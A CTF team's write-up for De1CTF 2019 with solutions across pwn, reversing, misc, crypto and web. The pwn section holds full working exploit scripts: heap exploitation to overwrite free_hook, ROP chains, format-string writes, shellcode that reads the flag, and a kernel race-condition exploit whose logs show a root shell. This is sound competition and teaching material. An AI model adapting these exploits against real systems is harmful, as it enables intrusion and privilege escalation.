# De1CTF CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190803-de1ctf/) of this writeup.**


 - [De1CTF CTF 2019](#de1ctf-ctf-2019)
   - [Pwn](#pwn)
     - [A B Judge](#ab-judge)
     - [Weapon](#weapon)
     - [BabyRust](#babyrust)
       - [Vulnerability](#vulnerability)
       - [Exploitation](#exploitation)
     - [race](#race)
     - [Mimic_note](#mimic_note)
     - [Unprintable](#unprintable)
   - [Rev](#rev)
     - [Re_Sign](#re_sign)
     - [Cplusplus](#cplusplus)
     - [Signal vm](#signal-vm)
     - [Evil_Boost](#evil_boost)
   - [Misc](#misc)
     - [Mine Sweeping](#mine-sweeping)
     - [Deep Encrypt](#deep-encrypt)
       - [Task](#task)
       - [Network](#network)
       - [Solution1: Projected Gradient Descent](#solution1-projected-gradient-descent)
       - [Solution2: Soft constraint](#solution2-soft-constraint)
       - [Solution3: Lattice based -- Shortest Integer Solution](#solution3-lattice-based----shortest-integer-solution)
   - [Crypto](#crypto)
     - [babyrsa](#babyrsa)
     - [xorz](#xorz)
     - [babylfsr](#babylfsr)
     - [Mini Purε](#mini-purε)
       - [Task](#task-1)
       - [Cipher Algorithm](#cipher-algorithm)
       - [Solution](#solution)
     - [Obscured](#obscured)
       - [Task](#task-2)
       - [Expression](#expression)
   - [Web](#web)
     - [SSRF Me](#ssrf-me)


You can refer the official repo [here](https://github.com/De1ta-team/De1CTF2019).

## Pwn

### A+B Judge
Solved in unintended way...

```c
#include <stdio.h>
#include <unistd.h>

int main()
{
int fd;
char buf[100];
fd = open("/home/ctf/flag", 0);
read(fd, buf, 100);
printf("%s\n", buf);

return 0;
}
```
`de1ctf{Br3@king_th3_J4il}`

### Weapon

```python=
from pwn import *

#r = process(["./pwn"],env={"LD_PRELOAD":"./libc.so.6"})
r = remote("139.180.216.34", 8888)
def create(idx,size,content):
	r.sendlineafter(">>","1")	
	r.sendlineafter(":",str(size))
	r.sendlineafter(":",str(idx))
	r.sendafter(":",content)


def rename(idx,content):
	r.sendlineafter(">>","3")	
	r.sendlineafter(":",str(idx))
	r.sendafter(":",content)

def remove(idx):
	r.sendlineafter(">>","2")	
	r.sendlineafter(":",str(idx))


create(0,0x10,p64(0)+p64(0x21))
create(1,0x10,"a")
create(2,0x60,"a")
create(3,0x60,"a")
remove(0)
remove(1)
rename(1,p8(0x10))
create(0,0x10,"a")
create(0,0x10,p64(0)+p64(0x91))
remove(1)
create(4,0x60,"a")
offset = 0x25dd#int(raw_input(":"),16)
create(5,0x10,p16(offset))
rename(2,"\x00"*0x48+p64(0x71))
remove(3)
remove(4)
rename(4,"\x90")
create(7,0x60,"a")
create(7,0x60,"a")
create(7,0x60,"a")
rename(7,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+"\x00")
r.recvline()
libc = u64(r.recvuntil("Done")[64:72])-0x3c5600
print hex(libc)

create(0,0x60,"a")
remove(0)
rename(0,p64(libc+0x3c4aed))
create(0,0x60,"a")
create(1,0x60,"\x00"*0x13+p64(libc+0xf02a4))
remove(0)
#input(hex(libc+0xf02a4)+":")
remove(0)

r.interactive()

```
### BabyRust
We were asked to pwn a rust program. Since the program is kind of complicated, lots of stuff were done by fuzzing/trial and error.

#### Vulnerability
With some fuzzing, we quickly found that we were able to leak the heap address by using the following payload:

```python
magic(1312) # send "1312" command
show()
# leak heap base
```

After that, we can also use the following payload to create an arbitrary read:

```python
edit("E", [addr, num2, 102, 103])
magic(1313)
magic(1314)
show()
# leak content @ addr
```

Also, by controlling `num2` in the above payload, we can free an arbitrary address. We can use this to create a double free situation.

#### Exploitation
We first leak the heap address and the libc address with the arbitrary read. 

After that, we planned to use the double free vulnerability to create a duplicate chunk in tcache @ 0x80, then use tcache poisoning to control `free_hook` and get the shell. To do this, we'll have to input our name with the address of `free_hook`. However, we found that this will trigger the "InvalidData, error: StringError("stream did not contain valid UTF-8")" error and failing our exploit.

It seems that the only way to overwrite `free_hook` is to control the value of `num1` ~ `num4` and overwrite it while the program assign those numbers to its data structure ( we'll call it magic box ). The size of the magic box is 0x40, so if we can create a chunk in tcache @ 0x40 and let it point to `free_hook`, later when the program create a new magic box and assign our input numbers, we'll be able to overwrite `free_hook` and get the shell. 

After some trial and error ( allocating random size of chunk, freeing random arbitrary address, ...etc), we eventually create a chunk point to `free_hook - 0x18` in tcache @ 0x40 with the double free vulnerability. We then create a magic box with `system`'s address as `num1`, so later when program assign `num1` to magic box, it'll overwrite `free_hook` to `system`, and spawn a shell while freeing our user name.

Final exploit:

```python
#!/usr/bin/env python

from pwn import *

# de1ctf{SOMEt1mes_Rust_1S_Vu1ner4bL3_56a61969}

libc = ELF("./libc-2.27.so")

def create(name, nums):
    r.sendlineafter("exit\n", "1")
    r.sendlineafter("name:", name)
    for i in xrange(4):
        r.sendlineafter(":", str(nums[i]))

def show():
    r.sendlineafter("exit\n", "2")

def edit(name, nums):
    r.sendlineafter("exit\n", "3")
    r.sendlineafter("name:", name)
    for i in xrange(4):
        r.sendlineafter(":", str(nums[i]))

def magic(cmd):
    r.sendlineafter("exit\n", str(cmd))

if __name__ == "__main__":

    r = remote("207.148.126.75", 60001)

    # leak heap
    magic(1312)
    show()
    r.recvuntil("S(")
    heap = int(r.recvuntil(",").strip(",")) - 0xa40
    
    # leak libc
    edit("E"*0x40, [heap+0x2c8, heap+0x2d10, 102, 103])
    magic(1313)
    magic(1314)
    show()
    r.recvuntil("boom(")
    libc.address = u64(r.recv(6).ljust(8, "\x00")) - 0x3ec680
    free_hook = libc.symbols.__free_hook

    # overwrite free_hook and get shell
    create("f"*0x8, [200, 201, 202, 203])
    create("g"*0x8, [300, 301, 302, free_hook-0x18]) # now free_hook-0x18 will be in 0x40 tcache
    create("i"*0x38, [400, 401, 402, 403])
    create("sh\x00", [500, 501, 0x80, heap+0x490])
    create("Z"*0x8, [ libc.symbols.system, 601, 602, 603]) # this will overwrite free_hook to system
    r.interactive()
```

### race

```c
./exp
0x1234000 = 0xffffa18e8442dc00
[   39.672314] general protection fault: 0000 [#1] SMP PTI
[   39.673411] CPU: 0 PID: 1096 Comm: exp Tainted: G           O      5.0.0-rc8+ #2
[   39.673662] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   39.674586] RIP: 0010:__kmalloc+0x8d/0x1a0
...
...
[   39.682351] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   39.682456] CR2: 00007ffe6ddfcfb0 CR3: 0000000004484000 CR4: 00000000003006f0
~ $ $ id
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
~ $ $ exit
exit
umount: can't unmount /dev: Device or resource busy
[   46.133945] sd 0:0:0:0: [sda] Synchronizing SCSI cache
[   46.135758] sd 0:0:0:0: [sda] Stopping disk
[   46.139729] general protection fault: 0000 [#2] SMP PTI
[   46.139867] CPU: 0 PID: 1102 Comm: poweroff Tainted: G      D    O      5.0.0-rc8+ #2
[   46.140011] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   46.140215] RIP: 0010:kmem_cache_alloc_trace+0x6e/0x160
[   46.140349] Code: 00 00 00 4d 8b 07 65 49 8b 50 08 65 4c 03 05 f1 ee 65 71 49 8b 28 48 85 ed 0f 84 ae 00 00 00 41 8b 47 20 49 8b 3f 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 c5 41 8b
[   46.140750] RSP: 0018:ffffa845800dfb18 EFLAGS: 00000206
[   46.140865] RAX: 0000000000000000 RBX: ffffa18e84b8f0c0 RCX: 0000000000000a2f
[   46.141008] RDX: 0000000000000a2e RSI: 00000000006080c0 RDI: 0000000000023cc0
[   46.141151] RBP: 4141414141414141 R08: ffffa18e87823cc0 R09: 0000000000000000
[   46.141300] R10: ffffa18e854d7690 R11: 000000000000005f R12: 00000000006080c0
...
...
[   46.163526] R10: ffffa845800e7d40 R11: 000000000000b702 R12: 00000000006080c0
[   46.163739] R13: 0000000000000385 R14: ffffa18e85401500 R15: ffffffffc02f8064
[   46.163873] FS:  000000000201a880(0000) GS:ffffa18e87800000(0000) knlGS:0000000000000000
[   46.164019] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.164126] CR2: 00000000004af430 CR3: 0000000004490000 CR4: 00000000003006f0

Please press Enter to activate this console. $

/ # $ id
id
uid=0(root) gid=0(root)
/ # $ ls
ls
bin      etc      home     linuxrc  sbin     tmp
dev      flag     lib      proc     sys      usr
/ # $ cat flag
cat flag
[   57.514984] general protection fault: 0000 [#4] SMP PTI
[   57.515146] CPU: 0 PID: 1110 Comm: cat Tainted: G      D    O      5.0.0-rc8+ #2
[   57.515284] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[   57.515482] RIP: 0010:__kmalloc+0x8d/0x1a0
[   57.515633] Code: 01 00 00 4d 8b 06 65 49 8b 50 08 65 4c 03 05 d2 e4 65 71 49 8b 28 48 85 ed 0f 84 cf 00 00 00 41 8b 46 20 49 8b 3e 48 8d 4a 01 <48> 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 c5 41 8b
...
...
[   57.524166] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   57.524274] CR2: 00007ffef6c32a28 CR3: 0000000004460000 CR4: 00000000003006f0
Segmentation fault
/ # $ source ./flag
source ./flag
-/bin/sh: ./flag: line 1: de1ctf{RaCE_C0nd1ti0n_For_FUN}: not found
```

exp :

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <stdlib.h>
int tmp;

#define TEST_READ 0x23333
#define TEST_WRITE 0x23334
#define TEST_DEL 0x23335

struct command{
  unsigned long size;
  char* context;
};

void test_r(int fd, unsigned long size ,char* context){
  struct command command;
  command.size = size;
  command.context = context;
  ioctl(fd, TEST_READ, &command);
}

void test_w(int fd ,unsigned long size ,char* context){
  struct command command;
  command.size = size;
  command.context = context;
  ioctl(fd, TEST_WRITE, &command);
}

void test_d(int fd){
  struct command command;
  ioctl(fd, TEST_DEL, &command);
}

char *addr1;
char *addr2;
char *addr3;
int fd;
int fd2;
fuck = 0x300;
void *child(void *arg) {
  for(int i=0;i<0x280;i++){
    fuck++;
    test_r(fd,fuck,addr2);
  }
  pthread_exit(NULL);
}

void *child2(void *arg) {
  for(int i=0;i<0x280;i++){
    fuck++;
    test_r(fd,fuck,addr2);
  }
  pthread_exit(NULL);
}

void *child3(void *arg) {
  for(int i=0;i<0x380;i++){
    if(fuck>0x400){
      fuck = 0x300;
      test_d(fd);
    }
    fuck++;
    test_r(fd,fuck,addr2);
  }
  pthread_exit(NULL);
}


int main(){
  addr1 = (void*)mmap((void*)0x1234000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
  addr2 = (void*)mmap((void*)0x1235000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
  addr3 = (void*)mmap((void*)0x1236000,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
  unsigned long *test1;
  unsigned long *test2;
  unsigned long *test3;
  unsigned long pgd_addr=0;
  unsigned long page_offset_base=0;
  unsigned long now_buffer=0;
  fd = open("/dev/test",O_RDONLY);
  fd2 = open("/dev/test",O_RDONLY);
  memset(addr1,0,0x1000);
  memset(addr2,0x41,0x1000);
  memset(addr3,0,0x1000);
  int check = 0;
  int success_index = 0;
  test1 = addr1;
  test2 = addr2;
  test3 = addr3;
  pthread_t t1,t2,t3;
  while(1){
    pthread_create(&t1, NULL, child, "Child");
    pthread_create(&t2, NULL, child2, "Child");
    pthread_create(&t3, NULL, child3, "Child");
    for(int i=0;i<0x400;i++){
      test_w(fd,0x300,addr1);
      for(int j=0;j<=0x100;j++){
        if(*(test1+j) != 0x4141414141414141 && *(test1+j)){
          printf("%p = %p\n",test1+j,*(test1+j));
          success_index = 1;
        }
      }
      if(success_index){
        break;
      }
    }

    pthread_join(t1,NULL);
    pthread_join(t2,NULL);
    pthread_join(t3,NULL);
    if(success_index){
      break;
    }
  }

}
```

### Mimic_note




exp:

```python=
from pwn import *

#r = process(["./mimic_note_32"])
#r = process(["./mimic_note_64"])
#r = process(["./mimic"])
r = remote("45.32.120.212", 6666)


def new(size):
	r.sendlineafter(">>","1")
	r.sendlineafter("?",str(size))

def remove(idx):
	r.sendlineafter(">>","2")
	r.sendlineafter("?",str(idx))

def show(idx):
	r.sendlineafter(">>","3")
	r.sendlineafter("?",str(idx))

def edit(idx,content):
	r.sendlineafter(">>","4")
	r.sendlineafter("?",str(idx))
	r.sendafter("?",content)

new(0x38)
new(0x120)
new(0x90)
new(0x70)
edit(1,"\x00"*0xf0+p64(0x100))
remove(1)
edit(0,"\x00"*0x38)
new(0x80) #1
new(0x60) #4
remove(1)
remove(2)
new(0x80) #1
new(0x60) #2
remove(2)
edit(4,p64(0x6020d0))
new(0x60)
new(0x60)
edit(5,p64(0x6020f0)+p64(0x100))

def readmem(addr):
	edit(4,p64(addr)+p64(0x8))
	show(5)

def writemem(addr,content):
	edit(4,p64(addr)+p64(len(content)))
	edit(5,content)

context.arch = "amd64"
payload = asm(shellcraft.connect(ip,port))+asm(shellcraft.cat("flag",'rbp'))
for i in range(0,len(payload),0x30):
	writemem(0x602d00+i,payload[i:i+0x30])



writemem(0x602500,"/bin/sh")

payload = flat(0,0,0,
0x400c33,0x400CF3,0x400670,0x400A64,
0x400C2A,0,1,0x602040,10,0x602040-9,0,0x400C10,0,
0,1,0x602040,0x7,0x1000,0x602000,0x400C10,0,
0,1,0x602040,0x7,0x1000,0x602000,0x400c33,0x400CF3,0x400670,0x400A64,
0x602d00
)
for i in range(0,len(payload),0x30):
	writemem(0x602200+i,payload[i:i+0x30])


writemem(0x602058,p64(0x400C32)[:-1])
r.sendafter(">> ",p64(0x400c2d)+p64(0x602200))
r.recvrepeat(1)
r.send("\x5e"*10)


r.interactive()



```


### Unprintable



exp:

```python=
from pwn import *

#r = process(["./unprintable"],env={"LD_PRELOAD":"./libc.so.6"})
r = remote("45.32.120.212", 9999)
r.recvuntil(":")
stack = int(r.recvline(),16)-0x120
print hex(stack)
p = stack&0xff
p += 8

r.send("%696c%26$ln".ljust(0x30,"\x00")+p64(0x4007a3))
r.recvrepeat(1)

r.send("%{}c%18$hhn%{}c%23$hn\x00".format(p,0x7a3-p))
r.recvrepeat(1)
r.send("%{}c%23$hn%{}c%13$hn\x00".format(0x7a3,0x1060-0x7a3))
r.recvrepeat(1)

r.send("%{}c%18$hhn%{}c%23$hn\x00".format(p+2,0x7a3-p-2))
r.recvrepeat(1)
r.send("%{}c%13$ln%{}c%23$hn\x00".format(0x60,0x7a3-0x60))
r.recvrepeat(1)

syscall = stack+0x120+0x18
context.arch = "amd64"
r.send("%2093c%23$hn".ljust(0x18,"\x00")+flat(
0x40082A,0,1,0x600fe0,1,syscall,0,0x400810,0,
0,1,0x600fe0,0x3b,0x601400,0,0x400810,0,
0,1,syscall,0,0,0x601400,0x400810
))
r.recvrepeat(1)
r.send("\xa4/bin/sh".ljust(0x3c,"\x00"))
r.recvrepeat(1)
r.sendline("sh 1>&0")
r.interactive()

```

## Rev

### Re_Sign

* Use ollydbg 2.0 to defeat UPX
* It uses base64 but with a cumstomized table `0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=`
* Then you can easily get the flag `de1ctf{E_L4nguag3_1s_K3KeK3_N4Ji4}`

### Cplusplus

* The input format should be like this `$1@$2#$3` `$1` `$2` `$3` are all numbers.
* The first number will be the seed of a random generator. And because the range is small. We can easily get the right number by brutal force.
* The second number will be the index of a string. It should be pretty easy to know the right number.
* The third number is also pretty easy to get.
* Finally the right flag is `de1ctf{78@20637#114}`

### Signal vm

* Just try to understand the meaning of the bytecode.
* Then you can find out that it try do some matrix multiplication.
* But it use modulo. So I use Z3 to get the flag.
* The flag is `de1ctf{7h3n_f4r3_u_w3ll_5w337_cr4g13_HILL_wh3r3_0f3n_71m35_1_v3_r0v3d}`

### Evil_Boost

* In this challenge, you can find out the constraints of flag.
* First, the length of flag is 11. And you should have 5 digits and 1 lower_case alphabet and 5 operators selected from `()/*-`
* Also the second byte should be lower_case alphabet.
* The flag content should be a math expression. and the result of the expression should be `24.0`. For instance, `dctf{3e1-(6)*1*1}` is a flag that can pass all the check.
* The final clue for the real flag is the md5 value of the flag `293316bfd246fa84e566d7999df88e79`
* In the end, I use brute forcing to get the one true flag `de1ctf{5e0*(5-1/5)}`



## Misc

### Mine Sweeping
Get a QR code and get the flag
`de1ctf{G3t_F1@g_AFt3R_Sw3ep1ng_M1n3s}`

### Deep Encrypt
#### Task
In this task, we have:
* Model's hdf5 file
* Output of secret
* A server that will yield flag when the input is close enough to secret.

#### Network
hdf5 model are usually tensorflow model, and tensorflow will store not only the weights but also the network structure.
Let's find it:

```bash
strings enc.hdf5 | grep config
```

It gives us some json strings:

```
{
   "class_name":"Model",
   "config":{
      "name":"model_1",
      "layers":[
         {
            "name":"input_1",
            "class_name":"InputLayer",
            "config":{
               "batch_input_shape":[ null, 128 ],
               "dtype":"float32",
               "sparse":false,
               "name":"input_1"
            },
            "inbound_nodes":[]
         },
         {
            "name":"dense_1",
            "class_name":"Dense",
            "config":{
               "name":"dense_1",
               "trainable":true,
               "units":64,
               "activation":"linear",
               "use_bias":true,
               "kernel_initializer":{
                  "class_name":"VarianceScaling",
                  "config":{
                     "scale":1.0,
                     "mode":"fan_avg",
                     "distribution":"uniform",
                     "seed":null
                  }
               },
               "bias_initializer":{
                  "class_name":"Zeros",
                  "config":{}
               },
               "kernel_regularizer":null,
               "bias_regularizer":null,
               "activity_regularizer":null,
               "kernel_constraint":null,
               "bias_constraint":null
            },
            "inbound_nodes":[ [ ["input_1", 0, 0, {}] ] ]
         }
      ],
      "input_layers":[ ["input_1", 0, 0] ],
      "output_layers":[ ["dense_1", 0, 0] ]
   }
}
```

So the DEEEEEP network is actually a affine transformation.

```
f(x) = xW + b: (2^128) -> (R^64).
```

The judge server will yield flag if MAE between input and the secret is lower than 0.2.

Let's formulate the problem:

```
Find argmin_x ||xW + b - y||
s.t.
x is in 2^128 (i.e. a 128 elements binary vector).
```

We have some different methods to solve this problem:
* Hard constraint with Projected Gradient Descent: Works.
* Soft constraint with some common GD optimizers: Not works very well.
* Lattice based method (SIS problem): Should also work.

#### Solution1: Projected Gradient Descent
This is the first method I thought, and the one I used to solve this problem.
Basically, it looks like:

```
x_{t+1} = proj(x_t - lr * grad(x_t))
```
where proj is a projection operator that map its input to a nearest valid point satisfying the constraints.

But it will easily stuck when gradient is not large enough to flip any bit.

I accumulate the gradient in a intermediate state to get rid of this problem:

```
x_t = proj(s_t)
s_{t+1} = s_t - lr * grad(x_t)
```
And here's the code I use:

```python
y0 = enc - b #x @ w

# Make x in {-1, 1}
b0 = (np.ones_like(x)*0.5) @ w
y = (y0 - b0) * 2

# Initialize using pseudo inverse
s = y @ np.linalg.pinv(w)

m, best = 1e10, None
for i in range(5000):
    # Prediction
    r = (s > 0).astype(np.float64)
    yy0 = r @ w
    yy = (yy0 - b0) * 2

    # Metrics
    score = np.abs(yy0 - y0).mean()
    if score < m:
        m, best = score, r
    if i % 500 == 0:
        print(score, m)

    # Gradient descent
    err = yy - y
    grad = w @ np.sign(err)
    s -= grad * 0.01
```

#### Solution2: Soft constraint
It may be possible to solve it with loss function like: 

```
L(x) = ||xW + b - y|| + S(x)
S(x) = || ||x - 0.5|| - 0.5 ||
```

And optimize it with some common optimizer, but I didn't make it works.

#### Solution3: Lattice based -- Shortest Integer Solution
Since this is a ML-related challenge, I didn't try to use crypto techniques while solving it.
After I capturing the flag, I recalled that I've solved a similar problem in Google CTF marked as crypto challenge -- reality.

That challenge was a under-constraint linear system with integer input and real output.

To solve it, we can scale up the fraction and truncated to a integer.
The scaled affine transformation equations forms a lattice.
We can use LLL to find the shortest integer solution (which is our secret) of the lattice.

You can find my writeup of that challenge from [here](https://sasdf.cf/ctf/writeup/2019/google/crypto/reality/).

## Crypto

### babyrsa 

- Chinese Remainder Theorem -> `p = 109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453`

- nroot(ce1,42) -> `e1 = 15218928658178`

- ce2 - tmp**3 => e2*(e2^2 + 3*e2*tmp + 3*tmp*tmp)
solve the equation   -> to get `e2 = 381791429275130`

- fermat factorization -> q1p, q1q

- q2 is given, we can just calculate the private key `d = invmod(e2//2,q2-1)`

- decrypt will get `flag ** 2` : `pow(c2,d,q2)`

- calculate the square root : 
`[114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472655243870708562439998143846037624187234195267715190427287523938294324544634339652501677902449588678234022620,
 3597756982424788530654510857179372044113434920098110365668160220641544533784058353001736221836299987936893]
`

- flag : `de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}`

### xorz

```python
from itertools import *

enc = ...
enc = [int(enc[i:i+2], 16) for i in range(0, len(enc), 2)]

salt = "WeAreDe1taTeam"
si = cycle(salt)
enc = [x ^ ord(next(si)) for x in enc]

def find_key_len():
    res = []
    blacklist = [34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 47, 60, 61, 62, 64, 91, 92, 93, 94, 96, 123, 124, 125, 126, 127]
    blacklist += list(range(48, 58))
    for key_len in range(3, 38):
        key = [0] * key_len
        res = []
        for pos in range(key_len):
            candi = []
            for ch in range(32, 128):
                for i in range(pos, len(enc), key_len):
                    pt = enc[i] ^ ch
                    if pt < 32 or pt in blacklist:
                        break
                else:
                    candi.append(ch)
            res.append(candi)
        if all(res):
            return key_len, res

key_len, res_30 = find_key_len()
# key_len = 30
 
def guess():
    key_len = 30
    key = [l[0] for l in res_30]
    for i in range(0, len(enc), key_len):
        xored = xor_l(enc[i:i+key_len], key)
        s = ''.join(map(chr, xored))
        print(s) # then google it to find the original text

guess()
# key = 'W3lc0m3tOjo1nu55un1ojOt3m0cl3W'
```

### babylfsr

```python
from bma import Berlekamp_Massey_algorithm
import hashlib

def sum_bit(x):
    return bin(x).count('1') % 2

LENGTH = 256

def recover(mask, output):
    res = ''
    working = output[:LENGTH]
    s_MASK = mask-(1<<(LENGTH-1))

    for i in range(LENGTH):
        x = int(working[:-1], 2)
        z = (sum_bit(x & s_MASK) + int(working[-1])) % 2
        working = str(z) + working[:-1]
        res = str(z) + res
    return int(res, 2)

def gen_output():
    LENGTH = 256
    output = ...

    for i in range(1<<8):
        x = bin(i)[2:].zfill(8)
        guess = output + x
        seq = tuple(map(int, list(guess)))

        (poly, span, s) = Berlekamp_Massey_algorithm(seq)
        mask = ''.join(['1' if i in s else '0' for i in range(256)])
        yield int(mask, 2)

def main():
    g = gen_output()
    while True:
        mask = next(g)
        KEY = recover(mask, output)

        FLAG = "de1ctf{"+hashlib.sha256(hex(KEY)[2:].rstrip('L')).hexdigest()+"}"
        if FLAG[7:11] == '1224':
            print(FLAG)
            raw_input()

main()
# de1ctf{1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619}
```

### Mini Purε
#### Task
It's a 6 round Feistel cipher with cube function under GF(2^24) as its Fbox.

```python
for k in keys: # len(keys) == 6
    l, r = r, l + (r + k)**3 # l, r, k are all elements under GF(2^24)
```

We can get 35 plain/cipher pairs.
It's using ECB mode, so we can get much more if we send more than one block at a time.

#### Cipher Algorithm
A feistel cipher with few round looks related to differential attack, So I start googling with keyword like `differential attack cube feistel`.
I found it's [PURE (or KN-Cipher)](https://en.wikipedia.org/wiki/KN-Cipher). There's some paper about in vulnerabilities, and [this](https://www.researchgate.net/publication/225190352_The_interpolation_attack_on_block_ciphers) is the earliest one.
There's some improved attack, but the original one is very simple and its computational complexity is feasible if implemented in C.

#### Solution
All operations in PURE are arithmetic in GF(2^24), which makes the cipher has very good algebraic properties. The whole cipher can be expressed as a polynomial under GF(2^24). And its degree is 273:

```
Input:   x      const
Round1:  const  x^1
Round2:  x^1    x^3
Round3:  x^3    x^9
Round4:  x^9    x^27
Round5:  x^27   x^91
Round6:  x^91   x^273
```

The last round left part's polynomial has only degree of 91, which means if we find more than 92 plain/cipher pairs, construct the polynomial using lagrange polynomials. The coefficients of term higher than 92 degrees will be zero.

```python
X0 = [str(random.randrange(1000000)).rjust(6, '0') for i in range(93)]
X = [int(x, 16) for x in X0]
Y0 = [encrypt(x, keys) for x in X0]
Y = [int(y[6:], 16) for y in Y0]
den = []
D = 1
for i, x in enumerate(X):
  d = 1
  for j, xx in enumerate(X):
    if i == j:
      continue
    d = F.Multiply(d, x ^ xx)
  D = F.Multiply(D, d)
  den.append(F.Inverse(d))

ret = 0
for y, d in zip(Y, den):
  ret ^= F.Multiply(y, F.Multiply(D, d))

assert ret == 0
```

And it works. Now we have a distinguisher between cipher's output and random numbers.
Like the standard differential attack, we guess the last unknown round key, decrypt it , and use the distinguisher to check if it is correct.

For example,
* Guess the round 6's subkey over GF(2^24).
* Decrypt it to get the output of round 5's left part.
* Check if that left part forms a 27 degree polynomials.
* If not, guess another subkey.

We can recover the round key one by one (in C/C++), and decrypt the flag :).

Note that it is different from FEAL's differential attack. In this task, we have to backtrack because all possible subkeys found in one round are not equivalent.

### Obscured
#### Task
It's a sbox based cipher, where the sbox in unknown.

```python
A, B, C, D = msg
for _ in range(6):
    S = Sbox(A^C)
    A, B, C, D   =   A ^ B ^ S,   A ^ B ^ D ^ S,   A ^ C ^ D,   C ^ D ^ S
```

We can get 20 plain/cipher pairs.

#### Expression

```python
a, b, c, d = {'A'}, {'B'}, {'C'}, {'D'}
for s in 'UVWXYZ':
    k = a^c
    print(s, ':=', ''.join(sorted(k)))
    s = {s}
    a, b, c, d =   a^b^s,   a^b^d^s,   a^c^d,   c^d^s
print(''.join(sorted(a)), ''.join(sorted(b)), ''.join(sorted(c)), ''.join(sorted(d)))
```

```
U := S( AC )
V := S( BCDU )
W := S( BDV )
X := S( ABCW )
Y := S( ACX )
Z := S( BCDUY )

a := DVWXZ
b := CUVYZ
c := BWX
d := AUVXYZ
```

After some elimination between a, b, c, d. We can get the value of `X, W, VZ, UY`. Furthermore:

```
bcd = ABCW
bd = ACX = AC S(ABCW) = AC S(bcd)
```
And we can get some input/output pair of the sbox.

But our goal is to find a output of specific input `target`.
After finding a pair (K, E) where S(K) = E, Let's look at `bcd`

```
We know
    bcd = ABCW = ABC S(BDV)

Set D = 0
    bcd = ABC S(BV)

Assume V == E
Set B = target ^ E
    bcd = ABC S(target)
    S(target) = bcdABC

Let's deal with V == E
V = S(BCDU) = S(BCU)
Assume U == E
Set C = K ^ B ^ E
    V = S(BCU) = S(K) = E

Let's deal with U == E
U = S(AC)
Set A = K ^ C
    U = S(AC) = S(K) = E
```

Now we're able to query the Sbox, just undo the encryption step by step to get the flag.

## Web

### SSRF Me
LEA + `local_file://`


`de1ctf{27782fcffbb7d00309a93bc49b74ca26}`
